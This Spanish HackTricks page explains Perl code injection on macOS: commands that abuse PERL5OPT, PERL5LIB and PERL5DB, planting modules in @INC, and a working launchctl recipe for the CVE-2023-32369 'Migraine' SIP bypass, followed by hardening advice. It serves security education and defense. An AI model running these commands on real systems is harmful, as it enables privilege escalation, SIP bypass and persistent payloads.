# Inyección de Aplicaciones Perl en macOS

{{#include ../../../banners/hacktricks-training.md}}

## A través de la variable de entorno `PERL5OPT` & `PERL5LIB`

Usando la variable de entorno **`PERL5OPT`** es posible hacer que **Perl** ejecute comandos arbitrarios cuando se inicia el intérprete (incluso **antes** de que se analice la primera línea del script objetivo).
Por ejemplo, crea este script:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Ahora **exporta la variable de entorno** y ejecuta el **script perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Otra opción es crear un módulo de Perl (por ejemplo, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Y luego usa las variables de entorno para que el módulo se localice y cargue automáticamente:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Otras variables de entorno interesantes

* **`PERL5DB`** – cuando el intérprete se inicia con la bandera **`-d`** (depurador), el contenido de `PERL5DB` se ejecuta como código Perl *dentro* del contexto del depurador. Si puedes influir tanto en el entorno **como** en las banderas de la línea de comandos de un proceso Perl privilegiado, puedes hacer algo como:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # abrirá un shell antes de ejecutar el script
```

* **`PERL5SHELL`** – en Windows, esta variable controla qué ejecutable de shell usará Perl cuando necesite crear un shell. Se menciona aquí solo por completitud, ya que no es relevante en macOS.

Aunque `PERL5DB` requiere el interruptor `-d`, es común encontrar scripts de mantenimiento o instalación que se ejecutan como *root* con esta bandera habilitada para una solución de problemas detallada, lo que convierte a la variable en un vector de escalación válido.

## A través de dependencias (abuso de @INC)

Es posible listar la ruta de inclusión que Perl buscará (**`@INC`**) ejecutando:
```bash
perl -e 'print join("\n", @INC)'
```
La salida típica en macOS 13/14 se ve así:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Algunas de las carpetas devueltas ni siquiera existen, sin embargo **`/Library/Perl/5.30`** sí existe, *no* está protegida por SIP y está *antes* de las carpetas protegidas por SIP. Por lo tanto, si puedes escribir como *root*, puedes dejar un módulo malicioso (por ejemplo, `File/Basename.pm`) que será *cargado preferentemente* por cualquier script privilegiado que importe ese módulo.

> [!WARNING]
> Aún necesitas **root** para escribir dentro de `/Library/Perl` y macOS mostrará un aviso de **TCC** pidiendo *Acceso Completo al Disco* para el proceso que realiza la operación de escritura.

Por ejemplo, si un script está importando **`use File::Basename;`**, sería posible crear `/Library/Perl/5.30/File/Basename.pm` que contenga código controlado por el atacante.

## Bypass de SIP a través del Asistente de Migración (CVE-2023-32369 “Migraine”)

En mayo de 2023, Microsoft divulgó **CVE-2023-32369**, apodado **Migraine**, una técnica de post-explotación que permite a un atacante *root* **eludir completamente la Protección de Integridad del Sistema (SIP)**. 
El componente vulnerable es **`systemmigrationd`**, un demonio con el derecho **`com.apple.rootless.install.heritable`**. Cualquier proceso hijo generado por este demonio hereda el derecho y, por lo tanto, se ejecuta **fuera** de las restricciones de SIP.

Entre los hijos identificados por los investigadores se encuentra el intérprete firmado por Apple:
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Porque Perl respeta `PERL5OPT` (y Bash respeta `BASH_ENV`), envenenar el *entorno* del daemon es suficiente para obtener ejecución arbitraria en un contexto sin SIP:
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Cuando `migrateLocalKDC` se ejecuta, `/usr/bin/perl` se inicia con el malicioso `PERL5OPT` y ejecuta `/private/tmp/migraine.sh` *antes de que SIP sea reactivado*. Desde ese script, puedes, por ejemplo, copiar una carga útil dentro de **`/System/Library/LaunchDaemons`** o asignar el atributo extendido `com.apple.rootless` para hacer que un archivo sea **indeleble**.

Apple solucionó el problema en macOS **Ventura 13.4**, **Monterey 12.6.6** y **Big Sur 11.7.7**, pero los sistemas más antiguos o no parcheados siguen siendo explotables.

## Recomendaciones de endurecimiento

1. **Limpiar variables peligrosas** – los launchdaemons o trabajos cron privilegiados deben iniciarse con un entorno limpio (`launchctl unsetenv PERL5OPT`, `env -i`, etc.).
2. **Evitar ejecutar intérpretes como root** a menos que sea estrictamente necesario. Utiliza binarios compilados o reduce privilegios temprano.
3. **Proveer scripts con `-T` (modo de contaminación)** para que Perl ignore `PERL5OPT` y otros interruptores inseguros cuando la verificación de contaminación está habilitada.
4. **Mantener macOS actualizado** – “Migraine” está completamente parcheado en las versiones actuales.

## Referencias

- Microsoft Security Blog – “Nueva vulnerabilidad de macOS, Migraine, podría eludir la Protección de Integridad del Sistema” (CVE-2023-32369), 30 de mayo de 2023.
- Hackyboiz – “Investigación sobre el eludir SIP de macOS (PERL5OPT & BASH_ENV)”, mayo de 2025.

{{#include ../../../banners/hacktricks-training.md}}
